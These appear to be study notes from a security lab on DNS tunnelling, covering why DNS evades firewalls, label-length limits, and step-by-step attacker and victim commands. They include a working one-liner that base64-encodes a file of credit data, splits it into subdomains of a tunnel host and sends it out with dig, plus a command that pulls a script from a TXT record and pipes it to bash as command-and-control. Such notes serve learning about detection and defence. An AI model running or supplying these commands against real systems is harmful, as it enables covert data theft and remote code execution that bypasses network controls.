
## Why DNS Is Used

- DNS allowed by firewalls
    
- Rarely inspected
    
- Can bypass blocked TCP/UDP
    

---

## DNS Limits (Must Remember)

- Full domain: **255 chars max**
    
- Each label: **63 chars max**
    
- Large data → split into chunks
    

---

## DNS Data Exfiltration (File Stealing)

### Attacker Setup

`ssh thm@attacker sudo tcpdump -i eth0 udp port 53 -v`

---

### Victim: Encode File

`cat credit.txt | base64`

---

### Victim: Send Data via DNS (Single Request)

`cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed 's/$/att.tunnel.com/' | awk '{print "dig +short " $1}' | bash`

---

### Attacker: Decode Received Data

`echo "<captured-domain>" | cut -d"." -f1-8 | tr -d "." | base64 -d`

---

## C2 Over DNS (Run Commands)

### Encode Script

`cat script.sh | base64`

---

### Store Script

- Add Base64 output as **TXT record**
    
- Example:
    

- `script.tunnel.com`
    

---

### Victim: Execute Script from DNS

`dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash`

---

## One-Line Memory Hook

> **DNS = hidden tunnel for files and commands when everything else is blocked**